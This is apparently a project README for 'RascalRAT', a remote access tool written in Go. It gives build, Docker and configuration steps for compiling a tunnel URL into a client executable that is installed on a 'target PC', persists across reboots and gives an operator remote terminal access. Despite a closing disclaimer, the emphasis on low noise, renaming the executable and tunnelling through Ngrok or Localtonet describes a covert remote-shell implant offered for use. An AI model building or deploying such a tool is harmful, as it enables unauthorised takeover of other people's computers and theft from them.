# RascalRAT

RascalRAT is a RAT(Remote Administrative Tool)
---

## Features

* Remote Terminal Execution: RascalRAT is made purposely for gaining Terminal access remotely, with a UI for easier and faster execution

* Persistence: RascalRAT auto registers itself in the list of `Auto-start-on-boot` apps, which survives reboot

* Stable: Very easy to install and use. Less noise, less CPU spikes, stable and can connect to remote panel anytime it comes online

---

## Installation

### Build from source
**Prerequisites that needs to be installed are:** 

- `GNU Make` 
- `Golang 1.25.0`

```bash
# 1. Clone this repository
gh repo clone the-hollowclan/RascalRAT # Using Github CLI

# 2. Open the folder
cd RascalRAT

# 3. Build the binaries
make build
## After building, install the client.exe on the target PC

# 4. Start the client
clear && ./bin/server
```

### Docker Installation
You can also run RascalRAT using Docker.

**Prerequisites:**
- Docker Engine
- Docker Compose (v2)

```bash
# 1. Clone this repository
gh repo clone the-hollowclan/RascalRAT
cd RascalRAT

# 2. Create a .env file (optional) to configure environment variables
#    You can copy the example below or leave blank to use defaults
cat > .env <<EOF
PORT=8182
TOKEN_SERVER_URL=https://web-token-page.onrender.com
EOF

# 3. Build and start the container
docker compose up -d --build

# 4. The server will be accessible at http://localhost:${PORT:-8182}
```

**To stop and remove the container:**
```bash
docker compose down
```

**To view logs:**
```bash
docker compose logs -f
```

---

## How to configure

1. Without a remote server, you can't manage remote devices, Setup a Domain or Tunnel URL on port 8182 and store it in config.txt with the command below or manually:

```bash
# replace 'https://s5kz6tdx9.localto.net' part with your Tunnel URL
echo "https://s5kz6tdx9.localto.net" > config.txt
```

In the v1.2+, there is no need to add `/ws/connect/?id` to the URL, 
Each client node automatically attaches its ID in the connection request.
This enhances the 'Compile once. Share everywhere'.

2. Build again to make sure that the Makefile process ports the new config.txt into the executable binary

```bash
make build
```

3. After the build the resulting RAT is stored at `bin/client.exe`, run it once on the target PC and it gets stored in the OS to work permanently. (Note: You can rename the executabble file, it'd work just fine)

4. Start the RAT server on your own localhost with the command below so that the client can connect to it through the tunnel URL

```bash
# execute
./bin/server # NOTE: This runs on PORT '8182'
```

5. Make sure you have started your preferred Tunnel, such as Localtonet, Ngrok, etc.

---

## Docker Usage Details

The Docker image exposes port 8182 by default (configurable via `PORT` environment variable). 
The server expects a `TOKEN_SERVER_URL` environment variable for token validation (used in the login screen).

### Environment Variables
- `PORT`: The port the server will listen on (default: 8182)
- `TOKEN_SERVER_URL`: URL for token validation server (default: https://web-token-page.onrender.com)

### Volumes
The Docker image does not use persistent volumes by default. To persist data (like config.txt and the public frontend assets), you can mount a volume:
```bash
docker compose up -d \
  -v $(pwd)/config.txt:/app/config.txt:ro \
  -v $(pwd)/public:/app/public:ro
```

---

## Contributions:

Contributions are welcomed

---

## Consent

Do not use RascalRAT to monitor and administer desktops illegitimately or unauthorised.
The collaborators of this project won't be held accountable for your mmisuse

Using RascalRAT to administer unauthorized desktops is illegitimate and may be illegal. You can be held responsible!